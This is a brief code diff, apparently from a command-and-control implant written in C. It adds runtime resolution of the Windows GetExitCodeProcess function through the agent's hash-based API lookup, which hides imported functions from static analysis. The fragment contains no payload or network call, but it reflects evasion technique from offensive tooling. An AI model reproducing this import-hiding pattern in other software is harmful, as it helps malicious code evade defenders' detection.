@@ -29,7 +29,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[65] = { 0 };
+UINT64 ApiHashes[66] = { 0 };
 
 INT init_agent(PVOID RetAddress) {
 
@@ -290,6 +290,10 @@ INT init_agent(PVOID RetAddress) {
 
     agent->apis->pCreateProcessW = (t_CreateProcessW)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[64]);
     if (!agent->apis->pCreateProcessW)
+        return -1;
+
+    agent->apis->pGetExitCodeProcess = (t_GetExitCodeProcess)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[65]);
+    if (!agent->apis->pGetExitCodeProcess)
         return -1;
 
     //obtain user32 apis
